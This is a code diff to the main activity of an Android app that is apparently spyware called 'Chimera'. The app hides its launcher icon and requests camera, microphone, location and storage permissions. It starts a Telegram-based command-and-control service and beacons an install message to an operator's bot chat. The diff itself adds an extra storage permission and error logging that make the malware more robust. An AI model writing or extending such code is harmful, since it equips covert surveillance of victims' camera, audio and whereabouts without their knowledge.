@@ -40,7 +40,9 @@ public class MainActivity extends AppCompatActivity {
                     ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
                     pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                     Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
-                } catch (Exception e) {}
+                } catch (Exception e) {
+                    ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
+                }
             }
         });
     }
@@ -51,7 +53,8 @@ public class MainActivity extends AppCompatActivity {
                 String[] perms = new String[]{
                         Manifest.permission.CAMERA,
                         Manifest.permission.RECORD_AUDIO,
-                        Manifest.permission.ACCESS_FINE_LOCATION
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE // Added permission
                 };
                 boolean need = false;
                 for (String p : perms) {
@@ -68,7 +71,9 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 startTelegram();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
+        }
     }
 
     @Override
@@ -84,18 +89,22 @@ public class MainActivity extends AppCompatActivity {
             startService(new Intent(this, TelegramC2Service.class));
             sendInstallMessage();
             finish();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "MainActivity_StartTelegram", e);
+        }
     }
 
     private void sendInstallMessage() {
-    try {
-        String token = ConfigLoader.getBotToken();
-        long chat = ConfigLoader.getAdminId();
-        if (token == null || chat == 0) return;
-        String url = "https://api.telegram.org/bot" + token + "/sendMessage";
-        String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
-        TelegramBotWorker worker = new TelegramBotWorker(this);
-        worker.post(url, body);
-    } catch (Exception e) {}
-}
+        try {
+            String token = ConfigLoader.getBotToken();
+            long chat = ConfigLoader.getAdminId();
+            if (token == null || chat == 0) return;
+            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
+            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
+            TelegramBotWorker worker = new TelegramBotWorker(this);
+            worker.post(url, body);
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "MainActivity_SendInstall", e);
+        }
+    }
 }
